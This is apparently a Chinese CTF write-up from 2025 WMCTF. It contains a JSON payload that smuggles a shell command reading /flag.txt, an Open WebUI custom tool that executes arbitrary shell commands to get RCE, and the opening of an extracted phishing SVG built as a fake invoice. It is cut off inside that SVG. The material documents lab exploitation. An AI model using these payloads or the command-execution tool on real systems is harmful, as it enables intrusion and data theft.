<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sales&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;period&quot;</span><span class="punctuation">:</span> <span class="string">&quot;monthly&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;template_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dynamic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sales&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;revenue&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;tac /flag.txt &gt; /app/static/3.txt &amp;&amp; sleep 5&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;date&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后现在去打40的openai webui的1day，我们首先就要考虑能够RCE的</p>
<h2><span id="shopping-company2">Shopping company2</span><a href="#shopping-company2" class="header-anchor"></a></h2><p><img src="../images/2025-WMCTF/8.png" alt="img"></p>
<p>拿到登录的账号密码，进去之后发现版本为v0.6.1 <a href="http://192.168.100.40:8080/auth?redirect=/">http://192.168.100.40:8080/auth?redirect=%2F</a></p>
<p>给open-webui加个deepseek的api，然后写一个工具，添加到open-webui的自定义工具里</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Any</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tools</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_system_command</span>(<span class="params">self, command: <span class="built_in">str</span>, timeout: <span class="built_in">int</span> = <span class="number">30</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Execute a system command and return the output.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        WARNING: This tool allows execution of ANY system command without safety checks.</span></span><br><span class="line"><span class="string">        Use with extreme caution as it can be dangerous and potentially harm your system.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param command: The system command to execute.</span></span><br><span class="line"><span class="string">        :param timeout: Maximum time in seconds to wait for command completion.</span></span><br><span class="line"><span class="string">        :return: The output of the command execution.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Execute the command with a timeout</span></span><br><span class="line">            result = subprocess.run(</span><br><span class="line">                command,</span><br><span class="line">                shell=<span class="literal">True</span>,</span><br><span class="line">                capture_output=<span class="literal">True</span>,</span><br><span class="line">                text=<span class="literal">True</span>,</span><br><span class="line">                timeout=timeout</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> result.returncode == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;Command executed successfully:\n<span class="subst">&#123;result.stdout&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;Command failed with error:\n<span class="subst">&#123;result.stderr&#125;</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Command timed out after <span class="subst">&#123;timeout&#125;</span> seconds.&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error executing command: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">execute_system_command_async</span>(<span class="params">self, command: <span class="built_in">str</span>, timeout: <span class="built_in">int</span> = <span class="number">30</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Execute a system command asynchronously and return the output.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        WARNING: This tool allows execution of ANY system command without safety checks.</span></span><br><span class="line"><span class="string">        Use with extreme caution as it can be dangerous and potentially harm your system.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param command: The system command to execute.</span></span><br><span class="line"><span class="string">        :param timeout: Maximum time in seconds to wait for command completion.</span></span><br><span class="line"><span class="string">        :return: The output of the command execution.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Execute the command asynchronously with a timeout</span></span><br><span class="line">            process = <span class="keyword">await</span> asyncio.create_subprocess_shell(</span><br><span class="line">                command,</span><br><span class="line">                stdout=asyncio.subprocess.PIPE,</span><br><span class="line">                stderr=asyncio.subprocess.PIPE</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                stdout, stderr = <span class="keyword">await</span> asyncio.wait_for(</span><br><span class="line">                    process.communicate(),</span><br><span class="line">                    timeout=timeout</span><br><span class="line">                )</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> process.returncode == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&quot;Command executed successfully:\n<span class="subst">&#123;stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&quot;Command failed with error:\n<span class="subst">&#123;stderr.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span></span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> asyncio.TimeoutError:</span><br><span class="line">                process.kill()</span><br><span class="line">                <span class="keyword">await</span> process.communicate()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;Command timed out after <span class="subst">&#123;timeout&#125;</span> seconds.&quot;</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error executing command: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_directory_contents</span>(<span class="params">self, path: <span class="built_in">str</span> = <span class="string">&quot;.&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        List the contents of a directory.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param path: The directory path to list. Defaults to current directory.</span></span><br><span class="line"><span class="string">        :return: A formatted string with directory contents.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;Path &#x27;<span class="subst">&#123;path&#125;</span>&#x27; does not exist.&quot;</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;&#x27;<span class="subst">&#123;path&#125;</span>&#x27; is not a directory.&quot;</span></span><br><span class="line">                </span><br><span class="line">            items = os.listdir(path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> items:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;Directory &#x27;<span class="subst">&#123;path&#125;</span>&#x27; is empty.&quot;</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># Format the output</span></span><br><span class="line">            result = <span class="string">f&quot;Contents of &#x27;<span class="subst">&#123;path&#125;</span>&#x27;:\n&quot;</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">                full_path = os.path.join(path, item)</span><br><span class="line">                <span class="keyword">if</span> os.path.isdir(full_path):</span><br><span class="line">                    result += <span class="string">f&quot;[DIR]  <span class="subst">&#123;item&#125;</span>/\n&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    size = os.path.getsize(full_path)</span><br><span class="line">                    result += <span class="string">f&quot;[FILE] <span class="subst">&#123;item&#125;</span> (<span class="subst">&#123;size&#125;</span> bytes)\n&quot;</span></span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error listing directory: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_system_info</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Get basic system information.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :return: A string with system information.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = []</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Get platform information</span></span><br><span class="line">            <span class="keyword">import</span> platform</span><br><span class="line">            info.append(<span class="string">f&quot;System: <span class="subst">&#123;platform.system()&#125;</span>&quot;</span>)</span><br><span class="line">            info.append(<span class="string">f&quot;Node: <span class="subst">&#123;platform.node()&#125;</span>&quot;</span>)</span><br><span class="line">            info.append(<span class="string">f&quot;Release: <span class="subst">&#123;platform.release()&#125;</span>&quot;</span>)</span><br><span class="line">            info.append(<span class="string">f&quot;Version: <span class="subst">&#123;platform.version()&#125;</span>&quot;</span>)</span><br><span class="line">            info.append(<span class="string">f&quot;Machine: <span class="subst">&#123;platform.machine()&#125;</span>&quot;</span>)</span><br><span class="line">            info.append(<span class="string">f&quot;Processor: <span class="subst">&#123;platform.processor()&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Get memory information (Linux/Mac)</span></span><br><span class="line">            <span class="keyword">if</span> platform.system() <span class="keyword">in</span> [<span class="string">&quot;Linux&quot;</span>, <span class="string">&quot;Darwin&quot;</span>]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/proc/meminfo&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> meminfo:</span><br><span class="line">                        <span class="keyword">for</span> line <span class="keyword">in</span> meminfo:</span><br><span class="line">                            <span class="keyword">if</span> line.startswith(<span class="string">&#x27;MemTotal:&#x27;</span>):</span><br><span class="line">                                info.append(<span class="string">f&quot;Total Memory: <span class="subst">&#123;line.split()[<span class="number">1</span>]&#125;</span> <span class="subst">&#123;line.split()[<span class="number">2</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(info)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error getting system info: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_current_working_directory</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Get the current working directory.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :return: The current working directory path.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Current working directory: <span class="subst">&#123;os.getcwd()&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error getting current directory: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">change_directory</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Change the current working directory.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :param path: The path to change to.</span></span><br><span class="line"><span class="string">        :return: A confirmation message or error.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.chdir(path)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Changed directory to: <span class="subst">&#123;os.getcwd()&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error changing directory: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>大概功能是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">可用工具：</span><br><span class="line">execute_system_command: 执行系统命令（同步）</span><br><span class="line">execute_system_command_async: 执行系统命令（异步）</span><br><span class="line">list_directory_contents: 列出目录内容</span><br><span class="line">get_system_info: 获取系统信息</span><br><span class="line">get_current_working_directory: 获取当前工作目录</span><br><span class="line">change_directory: 更改当前工作目录</span><br></pre></td></tr></table></figure>

<p>然后开个新对话，启动我们自定的工具</p>
<p><img src="../images/2025-WMCTF/9.png" alt="img"></p>
<p><code>execute_system_command &lt;命令&gt;</code>就可实现rce</p>
<p><img src="../images/2025-WMCTF/10.png" alt="img"></p>
<h2><span id="phishing-email">phishing email</span><a href="#phishing-email" class="header-anchor"></a></h2><p>邮件藏了个svg，提取出来代码如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 800 600&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Fake invoice design to look legitimate --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#f8f9fa&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">&quot;50&quot;</span> <span class="attr">y</span>=<span class="string">&quot;50&quot;</span> <span class="attr">width</span>=<span class="string">&quot;700&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;white&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#dee2e6&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Header --&gt;</span></span><br><span class="line">  <span 